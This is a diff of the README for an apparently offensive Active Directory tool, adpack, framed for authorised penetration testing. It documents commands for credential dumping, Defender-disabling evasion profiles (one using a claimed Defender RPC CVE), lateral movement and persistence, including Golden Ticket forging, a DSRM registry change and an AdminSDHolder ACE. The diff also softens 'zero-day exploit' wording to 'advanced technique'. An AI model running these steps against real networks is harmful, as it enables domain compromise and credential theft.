@@ -50,7 +50,7 @@ pipx install netexec
 ```bash
 git clone https://github.com/Yenn503/adpack.git
 cd adpack
-go build -o adpack main.go
+go build -o adpack .
 sudo mv adpack /usr/local/bin/
 ```
 
@@ -75,39 +75,15 @@ Create `~/.adpack/config.yaml`:
 # Database location
 db_path: "~/.adpack/state.db"
 
-# Target defaults
-target:
-  domain: "corp.local"
-  dc_ip: ""
-  username: ""
-  password: ""
-
 # Tool paths (auto-detected if in PATH)
-tools:
-  netexec: "netexec"
-  donut: "donut"
-  nanodump: "nanodump.exe"
-  gomimikatz: "go-mimikatz"
-  pypykatz: "pypykatz"
+nxc_path: "netexec"
+bh_python: "bloodhound-python"
 
-# Evasion settings
-evasion:
-  default_profile: "standard"
-  command_timeout: 120
-  retry_on_failure: false
-  max_retries: 3
-
-# Output settings
-output:
-  verbose: false
-  save_raw_output: true
-  raw_output_dir: "./output"
-  json_output: false
-
-# Phase settings
-phases:
-  skip_completed: true
-  auto_advance: false
+# Viper (Neo4j) connection for BloodHound queries
+viper:
+  enabled: false
+  host: "localhost"
+  port: 7687
 ```
 
 ## Attack Phases
@@ -151,7 +127,7 @@ adpack run credential_acq -e standard -t 10.0.0.5
 # Advanced evasion (EDR freeze + nanodump)
 adpack run credential_acq -e coldwer -t 10.0.0.5
 
-# Zero-day exploit (Defender RPC)
+# Advanced evasion (Defender RPC technique)
 adpack run credential_acq -e bluehammer -t 10.0.0.5
 ```
 
@@ -162,7 +138,45 @@ adpack run credential_acq -e bluehammer -t 10.0.0.5
 - Password spraying
 - NTDS.dit extraction
 
-### 4. Validation
+### 4. Session Harvesting
+
+Finds active user sessions on domain systems and measures identity convergence.
+
+```bash
+adpack run session_harvest --target 10.0.0.5
+```
+
+**Methods**:
+- NetExec SMB session enumeration (`--loggedon-users`)
+- Per-host domain resolution for session identity
+- Identity drift snapshot (resolved/unresolved/duplicate counters)
+
+### 5. Graph Analysis
+
+Collects AD structure for attack path mapping.
+
+```bash
+# Collect BloodHound data
+adpack run graph_analysis --target 10.0.0.5
+
+# Query specific paths (stub — Neo4j integration coming soon)
+adpack query "MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name"
+```
+
+### 6. Lateral Movement
+
+Lateral movement with validated creds.
+
+```bash
+adpack run lateral --target 10.0.0.6
+```
+
+**Methods**:
+- PSExec (smbexec)
+- WinRM
+- Schtasks (atexec)
+
+### 7. Validation
 
 Tests creds across SMB, LDAP, WinRM, RDP.
 
@@ -185,48 +199,9 @@ adpack validate --target 10.0.0.5
 - Lateral movement viability
 - Protocol-specific access levels
 
-### 5. Session Harvesting
-
-Finds active user sessions.
-
-```bash
-adpack run session_harvest --target 10.0.0.5
-```
-
-**Methods**:
-- NetExec SMB session enumeration
-- LDAP logon queries
-- WMI process enumeration
-
-### 6. Graph Analysis
-
-Maps attack paths with BloodHound.
-
-```bash
-# Collect BloodHound data
-adpack run graph_analysis --target 10.0.0.5
-
-# Query specific paths
-adpack query "MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name"
-```
-
-### 7. Lateral Movement
-
-Lateral movement with validated creds.
-
-```bash
-adpack run lateral --target 10.0.0.6
-```
-
-**Methods**:
-- PSExec
-- WinRM
-- WMI
-- DCOM
-
 ### 8. Privilege Escalation
 
-Exploits misconfigs for privesc.
+Checks for misconfigs and vulnerabilities for privesc.
 
 ```bash
 adpack run privesc --target 10.0.0.5
@@ -234,23 +209,37 @@ adpack run privesc --target 10.0.0.5
 
 **Techniques**:
 - ACL abuse
-- ADCS exploitation
+- ADCS vulnerability checks
 - RBCD attacks
 - GPP passwords
 
 ### 9. Persistence
 
-Sets up persistence.
+Deploys long-term access mechanisms against a domain controller. Each technique
+is independently attempted; missing tools or insufficient privilege skip that
+technique rather than failing the whole phase.
 
 ```bash
 adpack run persistence --target 10.0.0.5
 ```
 
-**Methods**:
-- krbtgt hash (Golden Ticket)
-- DSRM password
-- AdminSDHolder
-- Skeleton Key
+**Methods (all real, all gated by tool availability):**
+
+| Technique | Implementation | External tool |
+|-----------|----------------|----------------|
+| Scheduled task (onlogon, SYSTEM) | `schtasks /create` via failover exec | NetExec only |
+| DSRM password-reuse logon | `reg add HKLM\…\Lsa /v DSRMAdminLogonBehavior /d 2` | NetExec only |
+| Golden Ticket forge | `secretsdump -just-dc-user krbtgt` → `lookupsid` for SID → `ticketer` writes ccache | impacket-secretsdump, impacket-lookupsid, impacket-ticketer |
+| AdminSDHolder GenericAll | LDAP DACL write → SDProp propagates ACE every 60min | impacket-dacledit (preferred) or bloodyAD |
+| Skeleton Key (informational) | Detected when go-mimikatz remote-exec is viable; flagged in evidence, **not** auto-deployed (high noise) | — |
+
+**Operational notes:**
+- Golden Ticket ccache lands at `/tmp/golden_<user>.ccache`; the operator
+  exports `KRB5CCNAME=<path>` to authenticate as the forged user for follow-on commands.
+- AdminSDHolder grants the *currently authenticated* user GenericAll. The ACE
+  survives password resets because SDProp re-applies it every 60 minutes.
+- DSRM is only meaningful on DCs and only over SMB/RPC — not over RDP.
+- Use `adpack reset persistence` to clear evidence and the in-memory ccache references; on-target artifacts (scheduled task, AdminSDHolder ACE, DSRM regkey, Golden Ticket validity) must be reverted manually.
 
 ## Evasion Profiles
 
@@ -356,7 +345,7 @@ adpack run credential_acq -e coldwer -t 10.0.0.5
 
 ### UnDefend
 
-Kills Defender before dumping via Nightmare Eclipse exploit.
+Kills Defender before dumping via Nightmare Eclipse technique.
 
 ```bash
 adpack run credential_acq -e undefend -t 10.0.0.5
@@ -371,11 +360,11 @@ adpack run credential_acq -e undefend -t 10.0.0.5
 
 **Detection Risk**: 🟢 Low (Defender disabled)
 
-**Technique**: Kills Defender via service dependency exploit. Bypasses tamper protection.
+**Technique**: Kills Defender via service dependency method. Bypasses tamper protection.
 
 ### BlueHammer
 
-Zero-day RPC exploit for SAM extraction from Nightmare Eclipse leaks.
+Advanced RPC technique for SAM extraction from Nightmare Eclipse leaks.
 
 ```bash
 adpack run credential_acq -e bluehammer -t 10.0.0.5
@@ -383,16 +372,18 @@ adpack run credential_acq -e bluehammer -t 10.0.0.5
 
 **Pipeline**:
 1. Upload FunnyApp.exe
-2. Exploit CVE-2026-33825 (Defender RPC)
+2. Leverage CVE-2026-33825 (Defender RPC)
 3. Trigger VSS snapshot
 4. Extract SAM hive
 5. Parse local account hashes
 
-**Detection Risk**: 🟢 Very Low (zero-day, no LSASS access)
+**Detection Risk**: 🟢 Very Low (advanced technique, no LSASS access)
 
 **CVE Details**: Defender RPC bug lets unprivileged users dump SAM via VSS. No admin needed. No LSASS alerts. From Nightmare Eclipse leaks.
 
 **Assessment Value**: Tests if org can detect advanced cred theft. Simulates APT tradecraft.
+
+**Build status**: Requires Visual Studio 2022 on Windows (MSVC, RPC IDL, Windows SDK). Cannot be cross-compiled from Linux — see SETUP.md for details.
 
 ## Command Reference
 
@@ -425,6 +416,7 @@ adpack run <phase> [flags]
 Flags:
   -t, --target string             Target host IP or hostname
   -e, --evasion-profile string    Evasion profile (default "standard")
+      --provider-log string       File path for structured provider event logging (JSONL)
 ```
 
 #### autorun
@@ -439,6 +431,10 @@ Flags:
   -e, --evasion-profile string    Evasion profile (default "standard")
   -m, --max int                   Maximum phases to run (0 = unlimited)
       --skip-fail                 Continue past failed phases
+      --domain string             Domain for seed credentials
+      --user string               Username for seed credentials
+      --password string           Password for seed credentials
+      --provider-log string       File path for structured provider event logging (JSONL)
 ```
 
 #### validate
@@ -545,7 +541,7 @@ adpack autorun --target 10.0.0.5
 # 1. Enumerate target
 adpack run enumeration --target 10.0.0.5
 
-# 2. Use zero-day to disable Defender
+# 2. Use advanced technique to disable Defender
 adpack run credential_acq -e bluehammer -t 10.0.0.5
 
 # 3. Chain with LSASS dump
@@ -560,7 +556,7 @@ adpack run lateral --target 10.0.0.6
 
 ### Nightmare Eclipse Techniques
 
-Uses techniques from Nightmare Eclipse leaks. Nation-state level techniques. Helps orgs:
+Orchestrates techniques from Nightmare Eclipse leaks. Nation-state level methods. Helps orgs:
 
 1. **Test defences against APT-level attacks**
 2. **Find blind spots in EDR/AV**
@@ -611,21 +607,6 @@ Main tool for remote exec and enum.
 - Enumeration: `--users`, `--computers`, `--groups`
 - Validation: Authentication testing across protocols
 - Lateral: Remote command execution
-
-### Donut
-
-PE-to-shellcode converter for in-memory execution.
-
-**Configuration**:
-```yaml
-tools:
-  donut: "/usr/local/bin/donut"
-```
-
-**Usage**:
-- Converts go-mimikatz to position-independent shellcode
-- Enables in-memory execution without disk writes
-- Bypasses signature-based detection
 
 ### nanodump
 
@@ -704,22 +685,23 @@ netexec smb 10.0.0.5 -u user -p password --shares
 2. **Validate Early**: Test creds immediately after acquisition
 3. **Use Appropriate Evasion**: Match profile to target defences
 4. **Check State Frequently**: Run `adpack status` to track progress
-5. **Save Evidence**: Enable `save_raw_output` in config
+5. **Save Evidence**: Export logs and provider events for analysis
 6. **Test in Labs**: Use VulnAD/GOAD before production engagements
 7. **Document Findings**: Export state as JSON for reporting
 
 ## Security Considerations
 
 - Only use on authorised targets
-- Creds stored in plaintext in SQLite
-- Protect state database with appropriate permissions
+- Credentials are encrypted at rest using AES-GCM in SQLite
+- Protect state database with appropriate permissions (chmod 600)
+- **Credentials encrypted at rest with AES-GCM** — Use disk encryption and protect the encryption key for sensitive engagements
 - Clean up after engagements: `adpack reset state`
-- Zero-day exploits should be used responsibly
+- Advanced evasion techniques should be used responsibly and legally
 - Follow responsible disclosure for vulnerabilities found
 
 ### Nightmare Eclipse Ethics
 
-Nightmare Eclipse techniques mirror real adversary tradecraft. Use to:
+Nightmare Eclipse techniques mirror real adversary tradecraft. AdPack orchestrates these methods. Use to:
 
 - **Help orgs defend against advanced threats**
 - **Test security posture accurately**
